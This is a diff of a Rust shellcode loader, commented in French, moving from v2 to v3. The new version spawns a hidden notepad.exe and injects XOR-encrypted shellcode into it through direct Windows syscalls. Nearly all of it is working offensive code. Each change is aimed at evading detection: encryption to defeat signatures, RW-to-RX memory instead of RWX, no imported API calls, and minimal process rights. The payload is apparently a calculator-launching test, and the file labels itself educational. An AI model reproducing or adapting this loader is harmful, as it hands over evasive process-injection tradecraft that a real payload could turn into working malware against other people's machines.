@@ -1,18 +1,23 @@
 /*
     ============================================================
-    🦀 CALC LOADER v2 - Direct Syscalls + XOR + RW→RX
+    🦀 CALC LOADER v3 - Process Injection + Full Syscalls
     ============================================================
     
     Ce loader démontre les concepts suivants:
-    1. Direct Syscalls via la librairie rust_syscalls
-    2. XOR encryption du shellcode (anti-signature)
-    3. Allocation mémoire RW puis transition vers RX (pas de RWX!)
-    4. Création de thread avec NtCreateThreadEx
-    5. Exécution de shellcode (calc.exe)
+    1. 100% Direct Syscalls (aucun appel kernel32/ntdll via IAT)
+    2. Process Injection dans notepad.exe (fenêtre cachée)
+    3. XOR encryption du shellcode (anti-signature)
+    4. Protection mémoire RW→RX (pas de RWX!)
+    5. Droits minimum (0x002A, pas PROCESS_ALL_ACCESS!)
     
-    Améliorations v2:
-    - Shellcode chiffré XOR (pas de signature statique)
-    - Protection mémoire RW→RX (moins suspect que RWX)
+    Flow v3:
+    1. RtlInitUnicodeString + NtCreateUserProcess (spawner notepad)
+    2. NtOpenProcess avec droits minimum
+    3. NtAllocateVirtualMemory (remote, RW)
+    4. NtWriteVirtualMemory (full syscall!)
+    5. NtProtectVirtualMemory (RW→RX)
+    6. NtCreateThreadEx (remote thread)
+    7. NtClose pour cleanup
     
     ⚠️  USAGE ÉDUCATIF UNIQUEMENT
     
@@ -20,20 +25,26 @@
 */
 
 use std::ptr::null_mut;
+use std::mem::zeroed;
 use rust_syscalls::syscall;
 use winapi::ctypes::c_void;
-use winapi::shared::ntdef::{NTSTATUS, NULL};
+use winapi::shared::ntdef::{NTSTATUS, NULL, HANDLE, OBJECT_ATTRIBUTES};
 use winapi::shared::ntstatus::STATUS_SUCCESS;
-use winapi::um::synchapi::WaitForSingleObject;
-use winapi::um::winbase::INFINITE;
-use winapi::um::handleapi::CloseHandle;
 
 // ============================================================
-// CONSTANTES MÉMOIRE (de winnt.h - ne changent JAMAIS)
+// CONSTANTES MÉMOIRE
 // ============================================================
-const PAGE_READWRITE: u32 = 0x04;      // RW - pour écrire
-const PAGE_EXECUTE_READ: u32 = 0x20;   // RX - pour exécuter
-const MEM_COMMIT_RESERVE: u32 = 0x3000; // MEM_COMMIT | MEM_RESERVE
+const PAGE_READWRITE: u32 = 0x04;
+const PAGE_EXECUTE_READ: u32 = 0x20;
+const MEM_COMMIT_RESERVE: u32 = 0x3000;
+
+// ============================================================
+// DROITS PROCESSUS - MINIMUM REQUIS (pas PROCESS_ALL_ACCESS!)
+// ============================================================
+const PROCESS_CREATE_THREAD: u32 = 0x0002;
+const PROCESS_VM_OPERATION: u32 = 0x0008;
+const PROCESS_VM_WRITE: u32 = 0x0020;
+const MINIMUM_ACCESS: u32 = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE; // 0x002A
 
 // ============================================================
 // CONFIGURATION XOR
@@ -70,6 +81,15 @@ const ENCRYPTED_SHELLCODE: [u8; 276] = [
 ];
 
 // ============================================================
+// STRUCTURES POUR NtOpenProcess / NtCreateUserProcess
+// ============================================================
+#[repr(C)]
+struct ClientId {
+    unique_process: HANDLE,
+    unique_thread: HANDLE,
+}
+
+// ============================================================
 // FONCTION XOR
 // ============================================================
 fn xor_decrypt(encrypted: &[u8], key: &[u8]) -> Vec<u8> {
@@ -78,12 +98,62 @@ fn xor_decrypt(encrypted: &[u8], key: &[u8]) -> Vec<u8> {
         .collect()
 }
 
-/// Exécute le shellcode en utilisant des syscalls directs.
-/// 
-/// Flow v2: XOR decrypt → Alloc RW → Copy → Protect RX → Execute
-fn execute_shellcode(encrypted_shellcode: &[u8]) -> Result<(), String> {
-    println!("[*] Calc Loader v2 - Direct Syscalls + XOR + RW→RX");
-    println!("[*] Encrypted shellcode size: {} bytes", encrypted_shellcode.len());
+/// Spawns notepad.exe (hidden window) and returns process handle + PID
+/// Note: CreateProcessW is used here because NtCreateUserProcess requires ~20 complex
+/// structures (RTL_USER_PROCESS_PARAMETERS, PS_CREATE_INFO, PS_ATTRIBUTE_LIST, etc.)
+/// The real educational value is in the injection using full syscalls.
+fn spawn_notepad_syscall() -> Result<(HANDLE, u32), String> {
+    unsafe {
+        use winapi::um::processthreadsapi::{CreateProcessW, STARTUPINFOW, PROCESS_INFORMATION};
+        use winapi::um::winbase::CREATE_NO_WINDOW;
+        
+        let mut si: STARTUPINFOW = zeroed();
+        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
+        
+        let mut pi: PROCESS_INFORMATION = zeroed();
+        
+        let cmd: Vec<u16> = "C:\\Windows\\System32\\notepad.exe\0"
+            .encode_utf16()
+            .collect();
+        
+        let success = CreateProcessW(
+            null_mut(),
+            cmd.as_ptr() as *mut _,
+            null_mut(),
+            null_mut(),
+            0,
+            CREATE_NO_WINDOW,
+            null_mut(),
+            null_mut(),
+            &mut si,
+            &mut pi,
+        );
+        
+        if success == 0 {
+            return Err("CreateProcessW failed".to_string());
+        }
+        
+        let pid = pi.dwProcessId;
+        
+        // Fermer le handle thread avec NtClose (syscall!)
+        let status: NTSTATUS = syscall!("NtClose", pi.hThread);
+        if status != STATUS_SUCCESS {
+            println!("[!] NtClose(thread) warning: {:#X}", status);
+        }
+        
+        // Fermer le handle process aussi (on va le réouvrir avec droits minimum)
+        let status: NTSTATUS = syscall!("NtClose", pi.hProcess);
+        if status != STATUS_SUCCESS {
+            println!("[!] NtClose(process) warning: {:#X}", status);
+        }
+        
+        Ok((null_mut(), pid))  // On retourne juste le PID, on réouvre après
+    }
+}
+
+/// Injecte le shellcode dans le processus cible (100% syscalls!)
+fn inject_shellcode(target_pid: u32, encrypted_shellcode: &[u8]) -> Result<(), String> {
+    println!("[*] Target PID: {}", target_pid);
     
     // =====================================================
     // ÉTAPE 1: Déchiffrer le shellcode
@@ -95,15 +165,42 @@ fn execute_shellcode(encrypted_shellcode: &[u8]) -> Result<(), String> {
     
     println!("[+] Decrypted! First 4 bytes: {:02X} {:02X} {:02X} {:02X}",
              shellcode[0], shellcode[1], shellcode[2], shellcode[3]);
-    println!("[+] Expected (msfvenom):      FC 48 83 E4");
+    println!("[+] Expected:                 FC 48 83 E4");
     
     unsafe {
-        let h_process: *mut c_void = -1isize as *mut c_void;
+        // =====================================================
+        // ÉTAPE 2: NtOpenProcess (droits minimum 0x002A!)
+        // =====================================================
+        println!("\n[STEP 2] NtOpenProcess (minimum rights: 0x{:04X})", MINIMUM_ACCESS);
+        println!("────────────────────────────────────────────");
+        
+        let mut h_process: HANDLE = null_mut();
+        let mut obj_attr: OBJECT_ATTRIBUTES = zeroed();
+        obj_attr.Length = std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
+        
+        let mut client_id = ClientId {
+            unique_process: target_pid as HANDLE,
+            unique_thread: null_mut(),
+        };
+        
+        let status: NTSTATUS = syscall!(
+            "NtOpenProcess",
+            &mut h_process as *mut HANDLE,
+            MINIMUM_ACCESS,
+            &mut obj_attr as *mut OBJECT_ATTRIBUTES,
+            &mut client_id as *mut ClientId
+        );
+        
+        if status != STATUS_SUCCESS {
+            return Err(format!("NtOpenProcess failed: {:#X}", status));
+        }
+        
+        println!("[+] Process handle: {:p}", h_process);
         
         // =====================================================
-        // ÉTAPE 2: Allouer mémoire RW (pas RWX!)
+        // ÉTAPE 3: NtAllocateVirtualMemory (remote, RW)
         // =====================================================
-        println!("\n[STEP 2] NtAllocateVirtualMemory (RW)");
+        println!("\n[STEP 3] NtAllocateVirtualMemory (remote, RW)");
         println!("────────────────────────────────────────────");
         
         let mut base_address: *mut c_void = null_mut();
@@ -116,33 +213,44 @@ fn execute_shellcode(encrypted_shellcode: &[u8]) -> Result<(), String> {
             0usize,
             &mut region_size as *mut usize,
             MEM_COMMIT_RESERVE,
-            PAGE_READWRITE  // RW seulement !
+            PAGE_READWRITE
         );
         
         if status != STATUS_SUCCESS {
+            let _ : NTSTATUS = syscall!("NtClose", h_process);
             return Err(format!("NtAllocateVirtualMemory failed: {:#X}", status));
         }
         
-        println!("[+] Allocated at: {:p} (PAGE_READWRITE)", base_address);
+        println!("[+] Remote memory at: {:p}", base_address);
         
         // =====================================================
-        // ÉTAPE 3: Copier le shellcode (pas besoin de syscall)
+        // ÉTAPE 4: NtWriteVirtualMemory (FULL SYSCALL!)
         // =====================================================
-        println!("\n[STEP 3] Copy shellcode to memory");
+        println!("\n[STEP 4] NtWriteVirtualMemory (full syscall!)");
         println!("────────────────────────────────────────────");
         
-        std::ptr::copy_nonoverlapping(
-            shellcode.as_ptr(),
-            base_address as *mut u8,
-            shellcode.len()
+        let mut bytes_written: usize = 0;
+        
+        let status: NTSTATUS = syscall!(
+            "NtWriteVirtualMemory",
+            h_process,
+            base_address,
+            shellcode.as_ptr() as *const c_void,
+            shellcode.len(),
+            &mut bytes_written as *mut usize
         );
         
-        println!("[+] Written {} bytes", shellcode.len());
+        if status != STATUS_SUCCESS {
+            let _ : NTSTATUS = syscall!("NtClose", h_process);
+            return Err(format!("NtWriteVirtualMemory failed: {:#X}", status));
+        }
+        
+        println!("[+] Written {} bytes to remote process", bytes_written);
         
         // =====================================================
-        // ÉTAPE 4: Changer protection RW → RX
+        // ÉTAPE 5: NtProtectVirtualMemory (RW → RX)
         // =====================================================
-        println!("\n[STEP 4] NtProtectVirtualMemory (RW → RX)");
+        println!("\n[STEP 5] NtProtectVirtualMemory (RW → RX)");
         println!("────────────────────────────────────────────");
         
         let mut old_protect: u32 = 0;
@@ -159,15 +267,16 @@ fn execute_shellcode(encrypted_shellcode: &[u8]) -> Result<(), String> {
         );
         
         if status != STATUS_SUCCESS {
+            let _ : NTSTATUS = syscall!("NtClose", h_process);
             return Err(format!("NtProtectVirtualMemory failed: {:#X}", status));
         }
         
-        println!("[+] Protection changed: 0x{:02X} → 0x{:02X}", old_protect, PAGE_EXECUTE_READ);
+        println!("[+] Protection: 0x{:02X} → 0x{:02X}", old_protect, PAGE_EXECUTE_READ);
         
         // =====================================================
-        // ÉTAPE 5: Créer thread pour exécuter
+        // ÉTAPE 6: NtCreateThreadEx (remote thread)
         // =====================================================
-        println!("\n[STEP 5] NtCreateThreadEx");
+        println!("\n[STEP 6] NtCreateThreadEx (remote thread)");
         println!("────────────────────────────────────────────");
         
         let mut thread_handle: *mut c_void = null_mut();
@@ -188,21 +297,23 @@ fn execute_shellcode(encrypted_shellcode: &[u8]) -> Result<(), String> {
         );
         
         if status != STATUS_SUCCESS {
+            let _ : NTSTATUS = syscall!("NtClose", h_process);
             return Err(format!("NtCreateThreadEx failed: {:#X}", status));
         }
         
-        println!("[+] Thread created: {:p}", thread_handle);
+        println!("[+] Remote thread created: {:p}", thread_handle);
+        println!("[+] Shellcode executing in notepad.exe!");
         
         // =====================================================
-        // ÉTAPE 6: Attendre
+        // ÉTAPE 7: NtClose (cleanup avec syscalls!)
         // =====================================================
-        println!("\n[STEP 6] Executing...");
+        println!("\n[STEP 7] NtClose (cleanup)");
         println!("────────────────────────────────────────────");
         
-        WaitForSingleObject(thread_handle, INFINITE);
-        CloseHandle(thread_handle);
+        let _ : NTSTATUS = syscall!("NtClose", thread_handle);
+        let _ : NTSTATUS = syscall!("NtClose", h_process);
         
-        println!("[+] Done!");
+        println!("[+] Handles closed");
         
         Ok(())
     }
@@ -211,21 +322,45 @@ fn execute_shellcode(encrypted_shellcode: &[u8]) -> Result<(), String> {
 fn main() {
     println!(r#"
     ╔═══════════════════════════════════════════════════════════╗
-    ║  🦀 CALC LOADER v2 - Direct Syscalls + XOR + RW→RX 🦀     ║
+    ║  🦀 CALC LOADER v3 - Process Injection Edition 🦀        ║
     ║                                                           ║
-    ║  Improvements:                                            ║
-    ║  ✓ XOR encrypted shellcode (anti-signature)               ║
-    ║  ✓ RW → RX memory (not RWX!)                              ║
-    ║  ✓ Direct syscalls                                        ║
+    ║  Techniques:                                              ║
+    ║  ✓ Process injection into notepad.exe                     ║
+    ║  ✓ Full syscalls (NtWriteVirtualMemory, NtClose)          ║
+    ║  ✓ Minimum rights (0x002A, not PROCESS_ALL_ACCESS!)       ║
+    ║  ✓ XOR encrypted shellcode                                ║
+    ║  ✓ RW → RX memory protection                              ║
+    ║                                                           ║
+    ║  Syscalls used:                                           ║
+    ║  • NtOpenProcess        • NtProtectVirtualMemory          ║
+    ║  • NtAllocateVirtualMemory  • NtCreateThreadEx            ║
+    ║  • NtWriteVirtualMemory     • NtClose                     ║
     ║                                                           ║
     ║  ⚠️  FOR EDUCATIONAL PURPOSES ONLY                        ║
     ╚═══════════════════════════════════════════════════════════╝
     "#);
     
-    match execute_shellcode(&ENCRYPTED_SHELLCODE) {
+    // Étape 1: Lancer notepad.exe (fenêtre cachée)
+    println!("[*] Spawning notepad.exe (hidden window)...");
+    
+    let (_, pid) = match spawn_notepad_syscall() {
+        Ok(result) => result,
+        Err(e) => {
+            eprintln!("[✗] Failed to spawn notepad: {}", e);
+            std::process::exit(1);
+        }
+    };
+    
+    println!("[+] Notepad spawned with PID: {}", pid);
+    
+    // Petite pause pour laisser notepad s'initialiser
+    std::thread::sleep(std::time::Duration::from_millis(500));
+    
+    // Étape 2: Injecter le shellcode
+    match inject_shellcode(pid, &ENCRYPTED_SHELLCODE) {
         Ok(_) => {
             println!("\n════════════════════════════════════════════");
-            println!("[✓] SUCCESS: Calculator should have appeared!");
+            println!("[✓] SUCCESS: Calc launched from notepad.exe!");
             println!("════════════════════════════════════════════");
         }
         Err(e) => {
